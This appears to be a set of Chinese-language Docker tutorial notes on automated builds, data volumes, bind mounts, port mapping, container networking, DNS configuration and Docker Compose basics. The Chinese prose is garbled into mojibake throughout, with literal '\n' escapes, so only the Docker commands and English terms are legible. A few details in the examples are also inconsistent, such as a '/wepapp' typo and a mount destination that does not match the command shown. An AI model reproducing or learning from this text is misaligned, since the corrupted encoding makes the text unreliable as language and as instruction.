è‡ªåŠ¨åˆ›å»º\n\næœ‰æ—¶å€™ï¼Œç”¨æˆ·åˆ›å»ºäº†é•œåƒï¼Œå®‰è£…äº†æŸä¸ªè½¯ä»¶ï¼Œå¦‚æœè½¯ä»¶å‘å¸ƒæ–°ç‰ˆæœ¬åˆ™éœ€è¦æ‰‹åŠ¨æ›´æ–°é•œåƒã€‚\n\nè€Œè‡ªåŠ¨åˆ›å»ºå…è®¸ç”¨æˆ·é€šè¿‡ Docker Hub æŒ‡å®šè·Ÿè¸ªä¸€ä¸ªç›®æ ‡ç½‘ç«™ï¼ˆç›®å‰æ”¯æŒ [GitHub](https://github.com/) æˆ– [BitBucket](https://bitbucket.org/)ï¼‰ä¸Šçš„é¡¹ç›®ï¼Œä¸€æ—¦é¡¹ç›®å‘ç”Ÿæ–°çš„æäº¤æˆ–è€…åˆ›å»ºæ–°çš„æ ‡ç­¾ï¼ˆtagï¼‰ï¼ŒDocker Hub ä¼šè‡ªåŠ¨æ„å»ºé•œåƒå¹¶æ¨é€åˆ° Docker Hub ä¸­ã€‚\n\n \n\nè¦é…ç½®è‡ªåŠ¨åˆ›å»ºï¼ŒåŒ…æ‹¬å¦‚ä¸‹çš„æ­¥éª¤ï¼š\n\n- åˆ›å»ºå¹¶ç™»å½• Docker Hubï¼Œä»¥åŠç›®æ ‡ç½‘ç«™ï¼›\n- åœ¨ç›®æ ‡ç½‘ç«™ä¸­è¿æ¥å¸æˆ·åˆ° Docker Hubï¼›\n- åœ¨ Docker Hub ä¸­ [é…ç½®ä¸€ä¸ªè‡ªåŠ¨åˆ›å»º](https://registry.hub.docker.com/builds/add/)ï¼›\n- é€‰å–ä¸€ä¸ªç›®æ ‡ç½‘ç«™ä¸­çš„é¡¹ç›®ï¼ˆéœ€è¦å« `Dockerfile`ï¼‰å’Œåˆ†æ”¯ï¼›\n- æŒ‡å®š `Dockerfile` çš„ä½ç½®ï¼Œå¹¶æäº¤åˆ›å»ºã€‚\n\nä¹‹åï¼Œå¯ä»¥åœ¨ Docker Hub çš„ [è‡ªåŠ¨åˆ›å»ºé¡µé¢](https://registry.hub.docker.com/builds/) ä¸­è·Ÿè¸ªæ¯æ¬¡åˆ›å»ºçš„çŠ¶æ€ã€‚\n\n\n\n4.5 ç§æœ‰ä»“åº“\n\n[`docker-registry`](https://docs.docker.com/registry/)Â æ˜¯å®˜æ–¹æä¾›çš„å·¥å…·ï¼Œå¯ä»¥ç”¨äºæ„å»ºç§æœ‰çš„é•œåƒä»“åº“ã€‚\n\n\n\n\n\n# 5. æ•°æ®ç®¡ç†\n\n5.1 æ•°æ®å·\n\n `æ•°æ®å·`Â æ˜¯ä¸€ä¸ªå¯ä¾›ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ä½¿ç”¨çš„ç‰¹æ®Šç›®å½•ï¼Œå®ƒç»•è¿‡ UFSï¼Œå¯ä»¥æä¾›å¾ˆå¤šæœ‰ç”¨çš„ç‰¹æ€§ï¼š\n\n- `æ•°æ®å·` å¯ä»¥åœ¨å®¹å™¨ä¹‹é—´å…±äº«å’Œé‡ç”¨\n- å¯¹ `æ•°æ®å·` çš„ä¿®æ”¹ä¼šç«‹é©¬ç”Ÿæ•ˆ\n- å¯¹ `æ•°æ®å·` çš„æ›´æ–°ï¼Œä¸ä¼šå½±å“é•œåƒ\n- `æ•°æ®å·` é»˜è®¤ä¼šä¸€ç›´å­˜åœ¨ï¼Œå³ä½¿å®¹å™¨è¢«åˆ é™¤\n\næ³¨æ„ï¼š`æ•°æ®å·`Â çš„ä½¿ç”¨ï¼Œç±»ä¼¼äº Linux ä¸‹å¯¹ç›®å½•æˆ–æ–‡ä»¶è¿›è¡Œ mountï¼Œé•œåƒä¸­çš„è¢«æŒ‡å®šä¸ºæŒ‚è½½ç‚¹çš„ç›®å½•ä¸­çš„æ–‡ä»¶ä¼šéšè—æ‰ï¼Œèƒ½æ˜¾ç¤ºçœ‹çš„æ˜¯æŒ‚è½½çš„Â `æ•°æ®å·`ã€‚\n\n\n\n5.2 é€‰æ‹© -v è¿˜æ˜¯ -â€“mount å‚æ•°\n\nDocker æ–°ç”¨æˆ·åº”è¯¥é€‰æ‹© `--mount` å‚æ•°ï¼Œç»éªŒä¸°å¯Œçš„ Docker ä½¿ç”¨è€…å¯¹ `-v` æˆ–è€… `--volume` å·²ç»å¾ˆç†Ÿæ‚‰äº†ï¼Œä½†æ˜¯æ¨èä½¿ç”¨ `--mount` å‚æ•°ã€‚\n\n\n\n5.3 åˆ›å»ºä¸€ä¸ªæ•°æ®å·\n\n```\n$ docker volume create my-vol\n```\n\n\n\næŸ¥çœ‹æ‰€æœ‰çš„ `æ•°æ®å·`\n\n```\n$ docker volume ls\n\nlocal               my-vol\n```\n\n\n\nåœ¨ä¸»æœºé‡Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹æŒ‡å®š `æ•°æ®å·` çš„ä¿¡æ¯\n\n```\n$ docker volume inspect my-vol\n[\n    {\n        \"Driver\": \"local\",\n        \"Labels\": {},\n        \"Mountpoint\": \"/var/lib/docker/volumes/my-vol/_data\",\n        \"Name\": \"my-vol\",\n        \"Options\": {},\n        \"Scope\": \"local\"\n    }\n]\n```\n\n\n\n5.4 å¯åŠ¨ä¸€ä¸ªæŒ‚è½½æ•°æ®å·çš„å®¹å™¨\n\n åœ¨ç”¨Â `docker run`Â å‘½ä»¤çš„æ—¶å€™ï¼Œä½¿ç”¨Â `--mount`Â æ ‡è®°æ¥å°†Â `æ•°æ®å·`Â æŒ‚è½½åˆ°å®¹å™¨é‡Œã€‚åœ¨ä¸€æ¬¡Â `docker run`ä¸­å¯ä»¥æŒ‚è½½å¤šä¸ªÂ `æ•°æ®å·`ã€‚\n\n\n\nä¸‹é¢åˆ›å»ºä¸€ä¸ªåä¸º `web` çš„å®¹å™¨ï¼Œå¹¶åŠ è½½ä¸€ä¸ª `æ•°æ®å·` åˆ°å®¹å™¨çš„ `/webapp` ç›®å½•ã€‚\n\n \n\n```\n$ docker run -d -P \\\n    --name web \\\n    --mount source=my-vol,target=/webapp \\ \t\t\t\t(ç›¸ä¼¼) # -v my-vol:/wepapp \\\n    training/webapp \\\n    python app.py\n```\n\n\n\n5.5 æŸ¥çœ‹æ•°æ®å·çš„å…·ä½“ä¿¡æ¯\n\nåœ¨ä¸»æœºé‡Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹ `web` å®¹å™¨çš„ä¿¡æ¯\n\n```\n$ docker inspect web\n```\n\n\n\n`æ•°æ®å·` ä¿¡æ¯åœ¨ \"Mounts\" Key ä¸‹é¢\n\n```\n\"Mounts\": [\n    {\n        \"Type\": \"volume\",\n        \"Name\": \"my-vol\",\n        \"Source\": \"/var/lib/docker/volumes/my-vol/_data\",\n        \"Destination\": \"/app\",\n        \"Driver\": \"local\",\n        \"Mode\": \"\",\n        \"RW\": true,\n        \"Propagation\": \"\"\n    }\n],\n```\n\n\n\n5.6 åˆ é™¤æ•°æ®å·\n\n```\n$ docker volume rm my-vol\n```\n\n\n\n`æ•°æ®å·` æ˜¯è¢«è®¾è®¡ç”¨æ¥æŒä¹…åŒ–æ•°æ®çš„ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸç‹¬ç«‹äºå®¹å™¨ï¼ŒDocker ä¸ä¼šåœ¨å®¹å™¨è¢«åˆ é™¤åè‡ªåŠ¨åˆ é™¤ `æ•°æ®å·`ï¼Œå¹¶ä¸”ä¹Ÿä¸å­˜åœ¨åƒåœ¾å›æ”¶è¿™æ ·çš„æœºåˆ¶æ¥å¤„ç†æ²¡æœ‰ä»»ä½•å®¹å™¨å¼•ç”¨çš„ `æ•°æ®å·`ã€‚å¦‚æœéœ€è¦åœ¨åˆ é™¤å®¹å™¨çš„åŒæ—¶ç§»é™¤æ•°æ®å·ã€‚å¯ä»¥åœ¨åˆ é™¤å®¹å™¨çš„æ—¶å€™ä½¿ç”¨ `docker rm -v` è¿™ä¸ªå‘½ä»¤ã€‚\n\n\n\n æ— ä¸»çš„æ•°æ®å·å¯èƒ½ä¼šå æ®å¾ˆå¤šç©ºé—´ï¼Œè¦æ¸…ç†è¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤\n\n```\n$ docker volume prune\n```\n\n\n\n5.7 æŒ‚è½½ä¸€ä¸ªä¸»æœºç›®å½•ä½œä¸ºæ•°æ®å·\n\nä½¿ç”¨ `--mount` æ ‡è®°å¯ä»¥æŒ‡å®šæŒ‚è½½ä¸€ä¸ªæœ¬åœ°ä¸»æœºçš„ç›®å½•åˆ°å®¹å™¨ä¸­å»ã€‚\n\n```\n$ docker run -d -P \\\n    --name web \\\n    # -v /src/webapp:/opt/webapp \\\n    --mount type=bind,source=/src/webapp,target=/opt/webapp \\\n    training/webapp \\\n    python app.py\n```\n\nä¸Šé¢çš„å‘½ä»¤åŠ è½½ä¸»æœºçš„Â `/src/webapp`Â ç›®å½•åˆ°å®¹å™¨çš„Â `/opt/webapp`ç›®å½•ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨è¿›è¡Œæµ‹è¯•çš„æ—¶å€™ååˆ†æ–¹ä¾¿ï¼Œæ¯”å¦‚ç”¨æˆ·å¯ä»¥æ”¾ç½®ä¸€äº›ç¨‹åºåˆ°æœ¬åœ°ç›®å½•ä¸­ï¼Œæ¥æŸ¥çœ‹å®¹å™¨æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚æœ¬åœ°ç›®å½•çš„è·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„ï¼Œä»¥å‰ä½¿ç”¨Â `-v`Â å‚æ•°æ—¶å¦‚æœæœ¬åœ°ç›®å½•ä¸å­˜åœ¨ Docker ä¼šè‡ªåŠ¨ä¸ºä½ åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç°åœ¨ä½¿ç”¨Â `--mount`å‚æ•°æ—¶å¦‚æœæœ¬åœ°ç›®å½•ä¸å­˜åœ¨ï¼ŒDocker ä¼šæŠ¥é”™\n\n\n\nDocker æŒ‚è½½ä¸»æœºç›®å½•çš„é»˜è®¤æƒé™æ˜¯ `è¯»å†™`ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥é€šè¿‡å¢åŠ  `readonly` æŒ‡å®šä¸º `åªè¯»`ã€‚\n\n \n\n```\n$ docker run -d -P \\\n    --name web \\\n    # -v /src/webapp:/opt/webapp:ro \\\n    --mount type=bind,source=/src/webapp,target=/opt/webapp,readonly \\\n    training/webapp \\\n    python app.py\n```\n\nåŠ äº† `readonly` ä¹‹åï¼Œå°±æŒ‚è½½ä¸º `åªè¯»` äº†ã€‚å¦‚æœä½ åœ¨å®¹å™¨å†… `/opt/webapp` ç›®å½•æ–°å»ºæ–‡ä»¶ï¼Œä¼šæ˜¾ç¤ºå¦‚ä¸‹é”™è¯¯\n\n```\n/opt/webapp # touch new.txt\ntouch: new.txt: Read-only file system\n```\n\n\n\n5.8 æŸ¥çœ‹æ•°æ®å·çš„å…·ä½“ä¿¡æ¯\n\nåœ¨ä¸»æœºé‡Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹ `web` å®¹å™¨çš„ä¿¡æ¯\n\n```\n$ docker inspect web\n```\n\n`æŒ‚è½½ä¸»æœºç›®å½•` çš„é…ç½®ä¿¡æ¯åœ¨ \"Mounts\" Key ä¸‹é¢\n\n```\n\"Mounts\": [\n    {\n        \"Type\": \"bind\",\t\t\t#æ­¤å¤„ä¸º bind\n        \"Source\": \"/src/webapp\",\n        \"Destination\": \"/opt/webapp\",\n        \"Mode\": \"\",\n        \"RW\": true,\n        \"Propagation\": \"rprivate\"\n    }\n],\n```\n\n\n\n5.9 æŒ‚è½½ä¸€ä¸ªæœ¬åœ°ä¸»æœºæ–‡ä»¶ä½œä¸ºæ•°æ®å·\n\n`--mount`Â æ ‡è®°ä¹Ÿå¯ä»¥ä»ä¸»æœºæŒ‚è½½å•ä¸ªæ–‡ä»¶åˆ°å®¹å™¨ä¸­\n\n```\n$ docker run --rm -it \\\n   # -v $HOME/.bash_history:/root/.bash_history \\\n   --mount type=bind,source=$HOME/.bash_history,target=/root/.bash_history \\\n   ubuntu:17.10 \\\n   bash\n\nroot@2affd44b4667:/# history\n1  ls\n2  diskutil list\n```\n\nè¿™æ ·å°±å¯ä»¥è®°å½•åœ¨å®¹å™¨è¾“å…¥è¿‡çš„å‘½ä»¤äº†ã€‚\n\n\n\n# 6. ä½¿ç”¨ç½‘ç»œ\n\n6.1 å¤–éƒ¨è®¿é—®å®¹å™¨\n\nå®¹å™¨ä¸­å¯ä»¥è¿è¡Œä¸€äº›ç½‘ç»œåº”ç”¨ï¼Œè¦è®©å¤–éƒ¨ä¹Ÿå¯ä»¥è®¿é—®è¿™äº›åº”ç”¨ï¼Œå¯ä»¥é€šè¿‡ `-P` æˆ– `-p` å‚æ•°æ¥æŒ‡å®šç«¯å£æ˜ å°„ã€‚\n\nå½“ä½¿ç”¨ `-P` æ ‡è®°æ—¶ï¼ŒDocker ä¼šéšæœºæ˜ å°„ä¸€ä¸ª `49000~49900` çš„ç«¯å£åˆ°å†…éƒ¨å®¹å™¨å¼€æ”¾çš„ç½‘ç»œç«¯å£ã€‚\n\n\n\nä½¿ç”¨ `docker container ls` å¯ä»¥çœ‹åˆ°ï¼Œæœ¬åœ°ä¸»æœºçš„ 49155 è¢«æ˜ å°„åˆ°äº†å®¹å™¨çš„ 5000 ç«¯å£ã€‚æ­¤æ—¶è®¿é—®æœ¬æœºçš„ 49155 ç«¯å£å³å¯è®¿é—®å®¹å™¨å†… web åº”ç”¨æä¾›çš„ç•Œé¢ã€‚\n\n```\n$ docker run -d -P training/webapp python app.py\n\n$ docker container ls -l\nCONTAINER ID  IMAGE                   COMMAND       CREATED        STATUS        PORTS                    NAMES\nbc533791f3f5  training/webapp:latest  python app.py 5 seconds ago  Up 2 seconds  0.0.0.0:49155->5000/tcp  nostalgic_morse\n```\n\n \n\n`-p` åˆ™å¯ä»¥æŒ‡å®šè¦æ˜ å°„çš„ç«¯å£ï¼Œå¹¶ä¸”ï¼Œåœ¨ä¸€ä¸ªæŒ‡å®šç«¯å£ä¸Šåªå¯ä»¥ç»‘å®šä¸€ä¸ªå®¹å™¨ã€‚æ”¯æŒçš„æ ¼å¼æœ‰ \n\n`ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort`ã€‚\n\n\n\n6.2 æ˜ å°„æ‰€æœ‰æ¥å£åœ°å€ \n\nä½¿ç”¨ `hostPort:containerPort` æ ¼å¼æœ¬åœ°çš„ 5000 ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ 5000 ç«¯å£ï¼Œå¯ä»¥æ‰§è¡Œ\n\n```\n$ docker run -d -p 5000:5000 training/webapp python app.py\n```\n\næ­¤æ—¶é»˜è®¤ä¼šç»‘å®šæœ¬åœ°æ‰€æœ‰æ¥å£ä¸Šçš„æ‰€æœ‰åœ°å€ã€‚\n\n\n\n6.3 æ˜ å°„åˆ°æŒ‡å®šåœ°å€çš„æŒ‡å®šç«¯å£  \n\nå¯ä»¥ä½¿ç”¨ `ip:hostPort:containerPort` æ ¼å¼æŒ‡å®šæ˜ å°„ä½¿ç”¨ä¸€ä¸ªç‰¹å®šåœ°å€ï¼Œæ¯”å¦‚ localhost åœ°å€ 127.0.0.1\n\n```\n$ docker run -d -p 127.0.0.1:5000:5000 training/webapp python app.py\n```\n\n\n\n6.4 æ˜ å°„åˆ°æŒ‡å®šåœ°å€çš„ä»»æ„ç«¯å£\n\nä½¿ç”¨ `ip::containerPort` ç»‘å®š localhost çš„ä»»æ„ç«¯å£åˆ°å®¹å™¨çš„ 5000 ç«¯å£ï¼Œæœ¬åœ°ä¸»æœºä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªç«¯å£ã€‚\n\n```\n$ docker run -d -p 127.0.0.1::5000 training/webapp python app.py\n```\n\n\n\nè¿˜å¯ä»¥ä½¿ç”¨ `udp` æ ‡è®°æ¥æŒ‡å®š `udp` ç«¯å£\n\n```\n$ docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py\n```\n\n\n\n6.5 æŸ¥çœ‹æ˜ å°„ç«¯å£é…ç½®\n\n ä½¿ç”¨ `docker port` æ¥æŸ¥çœ‹å½“å‰æ˜ å°„çš„ç«¯å£é…ç½®ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹åˆ°ç»‘å®šçš„åœ°å€\n\n```\n$ docker port nostalgic_morse 5000\n127.0.0.1:49155.\n\n```\n\n\n\n- å®¹å™¨æœ‰è‡ªå·±çš„å†…éƒ¨ç½‘ç»œå’Œ ip åœ°å€ï¼ˆä½¿ç”¨ `docker inspect` å¯ä»¥è·å–æ‰€æœ‰çš„å˜é‡ï¼ŒDocker è¿˜å¯ä»¥æœ‰ä¸€ä¸ªå¯å˜çš„ç½‘ç»œé…ç½®ã€‚ï¼‰\n- `-p` æ ‡è®°å¯ä»¥å¤šæ¬¡ä½¿ç”¨æ¥ç»‘å®šå¤šä¸ªç«¯å£\n\nä¾‹å¦‚\n\n```\n$ docker run -d \\\n    -p 5000:5000 \\\n    -p 3000:80 \\\n    training/webapp \\\n    python app.py\n```\n\n\n\n6.7 å®¹å™¨äº’è”\n\n+ æ–°å»ºç½‘ç»œ\n\n ä¸‹é¢å…ˆåˆ›å»ºä¸€ä¸ªæ–°çš„ Docker ç½‘ç»œã€‚\n\n```\n$ docker network create -d bridge my-net\n```\n\n`-d` å‚æ•°æŒ‡å®š Docker ç½‘ç»œç±»å‹ï¼Œæœ‰ `bridge` `overlay`ã€‚å…¶ä¸­ `overlay` ç½‘ç»œç±»å‹ç”¨äº [Swarm mode](https://yeasy.gitbooks.io/docker_practice/content/swarm_mode)\n\n\n\n+ è¿æ¥å®¹å™¨\n\nè¿è¡Œä¸€ä¸ªå®¹å™¨å¹¶è¿æ¥åˆ°æ–°å»ºçš„ `my-net` ç½‘ç»œ\n\n```\n$ docker run -it --rm --name busybox1 --network my-net busybox sh\n```\n\n\n\næ‰“å¼€æ–°çš„ç»ˆç«¯ï¼Œå†è¿è¡Œä¸€ä¸ªå®¹å™¨å¹¶åŠ å…¥åˆ° `my-net` ç½‘ç»œ\n\n```\n$ docker run -it --rm --name busybox2 --network my-net busybox sh\n```\n\n\n\nå†æ‰“å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯æŸ¥çœ‹å®¹å™¨ä¿¡æ¯\n\n```\n$ docker container ls\n\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\nb47060aca56b        busybox             \"sh\"                11 minutes ago      Up 11 minutes                           busybox2\n8720575823ec        busybox             \"sh\"                16 minutes ago      Up 16 minutes                           busybox1\n```\n\n\n\nä¸‹é¢é€šè¿‡ `ping` æ¥è¯æ˜ `busybox1` å®¹å™¨å’Œ `busybox2` å®¹å™¨å»ºç«‹äº†äº’è”å…³ç³»ã€‚\n\nåœ¨ `busybox1` å®¹å™¨è¾“å…¥ä»¥ä¸‹å‘½ä»¤\n\n```\n/ # ping busybox2\nPING busybox2 (172.19.0.3): 56 data bytes\n64 bytes from 172.19.0.3: seq=0 ttl=64 time=0.072 ms\n64 bytes from 172.19.0.3: seq=1 ttl=64 time=0.118 ms\n```\n\n\n\nç”¨ ping æ¥æµ‹è¯•è¿æ¥ `busybox2` å®¹å™¨ï¼Œå®ƒä¼šè§£ææˆ `172.19.0.3`ã€‚\n\nåŒç†åœ¨ `busybox2` å®¹å™¨æ‰§è¡Œ `ping busybox1`ï¼Œä¹Ÿä¼šæˆåŠŸè¿æ¥åˆ°ã€‚\n\n```\n/ # ping busybox1\nPING busybox1 (172.19.0.2): 56 data bytes\n64 bytes from 172.19.0.2: seq=0 ttl=64 time=0.064 ms\n64 bytes from 172.19.0.2: seq=1 ttl=64 time=0.143 ms\n```\n\nè¿™æ ·ï¼Œ`busybox1` å®¹å™¨å’Œ `busybox2` å®¹å™¨å»ºç«‹äº†äº’è”å…³ç³»ã€‚\n\nå¦‚æœä½ æœ‰å¤šä¸ªå®¹å™¨ä¹‹é—´éœ€è¦äº’ç›¸è¿æ¥ï¼Œæ¨èä½¿ç”¨Â [Docker Compose](https://yeasy.gitbooks.io/docker_practice/content/compose)ã€‚\n\n\n\n6.8 é…ç½® DNS\n\n å¦‚ä½•è‡ªå®šä¹‰é…ç½®å®¹å™¨çš„ä¸»æœºåå’Œ DNS å‘¢ï¼Ÿç§˜è¯€å°±æ˜¯ Docker åˆ©ç”¨è™šæ‹Ÿæ–‡ä»¶æ¥æŒ‚è½½å®¹å™¨çš„ 3 ä¸ªç›¸å…³é…ç½®æ–‡ä»¶ã€‚\n\nåœ¨å®¹å™¨ä¸­ä½¿ç”¨ `mount` å‘½ä»¤å¯ä»¥çœ‹åˆ°æŒ‚è½½ä¿¡æ¯ï¼š\n\n```\n$ mount\n/dev/disk/by-uuid/1fec...ebdf on /etc/hostname type ext4 ...\n/dev/disk/by-uuid/1fec...ebdf on /etc/hosts type ext4 ...\ntmpfs on /etc/resolv.conf type tmpfs ...\n```\n\nè¿™ç§æœºåˆ¶å¯ä»¥è®©å®¿ä¸»ä¸»æœº DNS ä¿¡æ¯å‘ç”Ÿæ›´æ–°åï¼Œæ‰€æœ‰ Docker å®¹å™¨çš„ DNS é…ç½®é€šè¿‡ `/etc/resolv.conf`æ–‡ä»¶ç«‹åˆ»å¾—åˆ°æ›´æ–°ã€‚\n\né…ç½®å…¨éƒ¨å®¹å™¨çš„ DNS ï¼Œä¹Ÿå¯ä»¥åœ¨ `/etc/docker/daemon.json` æ–‡ä»¶ä¸­å¢åŠ ä»¥ä¸‹å†…å®¹æ¥è®¾ç½®ã€‚\n\n```\n{\n  \"dns\" : [\n    \"114.114.114.114\",\n    \"8.8.8.8\"\n  ]\n} \n```\n\n\n\nå¦‚æœç”¨æˆ·æƒ³è¦æ‰‹åŠ¨æŒ‡å®šå®¹å™¨çš„é…ç½®ï¼Œå¯ä»¥åœ¨ä½¿ç”¨ `docker run` å‘½ä»¤å¯åŠ¨å®¹å™¨æ—¶åŠ å…¥å¦‚ä¸‹å‚æ•°ï¼š\n\n `-h HOSTNAME`Â æˆ–è€…Â `--hostname=HOSTNAME`Â è®¾å®šå®¹å™¨çš„ä¸»æœºåï¼Œå®ƒä¼šè¢«å†™åˆ°å®¹å™¨å†…çš„Â `/etc/hostname`å’ŒÂ `/etc/hosts`ã€‚ä½†å®ƒåœ¨å®¹å™¨å¤–éƒ¨çœ‹ä¸åˆ°ï¼Œæ—¢ä¸ä¼šåœ¨Â `docker container ls`Â ä¸­æ˜¾ç¤ºï¼Œä¹Ÿä¸ä¼šåœ¨å…¶ä»–çš„å®¹å™¨çš„Â `/etc/hosts`Â çœ‹åˆ°ã€‚\n\n\n\n`--dns=IP_ADDRESS`Â æ·»åŠ  DNS æœåŠ¡å™¨åˆ°å®¹å™¨çš„Â `/etc/resolv.conf`Â ä¸­ï¼Œè®©å®¹å™¨ç”¨è¿™ä¸ªæœåŠ¡å™¨æ¥è§£ææ‰€æœ‰ä¸åœ¨Â `/etc/hosts`Â ä¸­çš„ä¸»æœºåã€‚\n\n\n\n`--dns-search=DOMAIN`Â è®¾å®šå®¹å™¨çš„æœç´¢åŸŸï¼Œå½“è®¾å®šæœç´¢åŸŸä¸ºÂ `.example.com`Â æ—¶ï¼Œåœ¨æœç´¢ä¸€ä¸ªåä¸º host çš„ä¸»æœºæ—¶ï¼ŒDNS ä¸ä»…æœç´¢ hostï¼Œè¿˜ä¼šæœç´¢Â `host.example.com`ã€‚\n\n\n\n> æ³¨æ„ï¼šå¦‚æœåœ¨å®¹å™¨å¯åŠ¨æ—¶æ²¡æœ‰æŒ‡å®šæœ€åä¸¤ä¸ªå‚æ•°ï¼ŒDocker ä¼šé»˜è®¤ç”¨ä¸»æœºä¸Šçš„Â `/etc/resolv.conf`Â æ¥é…ç½®å®¹å™¨ã€‚\n\n\n\n\n\n# 7. é«˜çº§ç½‘ç»œé…ç½® TODO:\n\n\n\n# 8. Docker Compose(ç»„æˆ) é¡¹ç›®\n\n8.1 Compose ç®€ä»‹\n\n`Compose`Â é¡¹ç›®æ˜¯ Docker å®˜æ–¹çš„å¼€æºé¡¹ç›®ï¼Œè´Ÿè´£å®ç°å¯¹ Docker å®¹å™¨é›†ç¾¤çš„å¿«é€Ÿç¼–æ’ã€‚\n\n\n\nåœ¨æ—¥å¸¸å·¥ä½œä¸­ï¼Œç»å¸¸ä¼šç¢°åˆ°éœ€è¦å¤šä¸ªå®¹å™¨ç›¸äº’é…åˆæ¥å®ŒæˆæŸé¡¹ä»»åŠ¡çš„æƒ…å†µã€‚ä¾‹å¦‚è¦å®ç°ä¸€ä¸ª Web é¡¹ç›®ï¼Œé™¤äº† Web æœåŠ¡å®¹å™¨æœ¬èº«ï¼Œå¾€å¾€è¿˜éœ€è¦å†åŠ ä¸Šåç«¯çš„æ•°æ®åº“æœåŠ¡å®¹å™¨ï¼Œç”šè‡³è¿˜åŒ…æ‹¬è´Ÿè½½å‡è¡¡å®¹å™¨ç­‰ã€‚\n\n\n\n`Compose` æ°å¥½æ»¡è¶³äº†è¿™æ ·çš„éœ€æ±‚ã€‚å®ƒå…è®¸ç”¨æˆ·é€šè¿‡ä¸€ä¸ªå•ç‹¬çš„ `docker-compose.yml` æ¨¡æ¿æ–‡ä»¶ï¼ˆYAML æ ¼å¼ï¼‰æ¥\tå®šä¹‰ä¸€ç»„ç›¸å…³è”çš„åº”ç”¨å®¹å™¨ä¸ºä¸€ä¸ªé¡¹ç›®ï¼ˆprojectï¼‰ã€‚\n\n \n\n`Compose` ä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„æ¦‚å¿µï¼š\n\n- æœåŠ¡ (`service`)ï¼šä¸€ä¸ªåº”ç”¨çš„å®¹å™¨ï¼Œ*å®é™…ä¸Šå¯ä»¥åŒ…æ‹¬è‹¥å¹²è¿è¡Œç›¸åŒé•œåƒçš„å®¹å™¨å®ä¾‹ã€‚*\n- é¡¹ç›® (`project`)ï¼šç”±ä¸€ç»„å…³è”çš„åº”ç”¨å®¹å™¨ç»„æˆçš„ä¸€ä¸ªå®Œæ•´ä¸šåŠ¡å•å…ƒï¼Œåœ¨ `docker-compose.yml` æ–‡ä»¶ä¸­å®šä¹‰ã€‚\n\n\n\nä¸€ä¸ªé¡¹ç›®å¯ä»¥ç”±å¤šä¸ªæœåŠ¡ï¼ˆå®¹å™¨ï¼‰å…³è”è€Œæˆï¼Œ`Compose`Â é¢å‘é¡¹ç›®è¿›è¡Œç®¡ç†ã€‚\n\n\n\n8.2 å®‰è£…ä¸å¸è½½\n\n- `Compose` å¯ä»¥é€šè¿‡ Python çš„åŒ…ç®¡ç†å·¥å…· `pip` è¿›è¡Œå®‰è£…\n\n- ä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶ä½¿ç”¨\n- ç”šè‡³èƒ½å¤Ÿç›´æ¥åœ¨ Docker å®¹å™¨ä¸­è¿è¡Œ\n\nå‰ä¸¤ç§æ–¹å¼æ˜¯ä¼ ç»Ÿæ–¹å¼ï¼Œé€‚åˆæœ¬åœ°ç¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨ï¼›æœ€åä¸€ç§æ–¹å¼åˆ™ä¸ç ´åç³»ç»Ÿç¯å¢ƒï¼Œæ›´é€‚åˆäº‘è®¡ç®—åœºæ™¯ã€‚\n\n```\n$ docker-compose --version\ndocker-compose version 1.21.0, build 5920eb0\n```\n\n\n\n8.3 Compose å‘½ä»¤è¯´æ˜ä½¿ç”¨\n\nå¯¹äº Compose æ¥è¯´ï¼Œå¤§éƒ¨åˆ†å‘½ä»¤çš„å¯¹è±¡æ—¢å¯ä»¥æ˜¯é¡¹ç›®æœ¬èº«ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºé¡¹ç›®ä¸­çš„æœåŠ¡æˆ–è€…å®¹å™¨ã€‚å¦‚æœæ²¡æœ‰ç‰¹åˆ«çš„è¯´æ˜ï¼Œå‘½ä»¤å¯¹è±¡å°†æ˜¯é¡¹ç›®ï¼Œè¿™æ„å‘³ç€é¡¹ç›®ä¸­æ‰€æœ‰çš„æœåŠ¡éƒ½ä¼šå—åˆ°å‘½ä»¤å½±å“ã€‚\n\n \n\n`docker-compose` å‘½ä»¤çš„åŸºæœ¬çš„ä½¿ç”¨æ ¼å¼æ˜¯\n\n```\ndocker-compose [-f=<arg>...] [options] [COMMAND] [ARGS...]\n```\n\n \n\nå‘½ä»¤é€‰é¡¹\n\n- `-f, --file FILE` æŒ‡å®šä½¿ç”¨çš„ Compose æ¨¡æ¿æ–‡ä»¶ï¼Œé»˜è®¤ä¸º `docker-compose.yml`ï¼Œå¯ä»¥å¤šæ¬¡æŒ‡å®šã€‚\n- `-p, --project-name NAME` æŒ‡å®šé¡¹ç›®åç§°ï¼Œé»˜è®¤å°†ä½¿ç”¨æ‰€åœ¨ç›®å½•åç§°ä½œä¸ºé¡¹ç›®åã€‚\n- `--x-networking` ä½¿ç”¨ Docker çš„å¯æ‹”æ’ç½‘ç»œåç«¯ç‰¹æ€§\n- `--x-network-driver DRIVER` æŒ‡å®šç½‘ç»œåç«¯çš„é©±åŠ¨ï¼Œé»˜è®¤ä¸º `bridge`\n- `--verbose` è¾“å‡ºæ›´å¤šè°ƒè¯•ä¿¡æ¯ã€‚\n- `-v, --version` æ‰“å°ç‰ˆæœ¬å¹¶é€€å‡ºã€‚\n\n 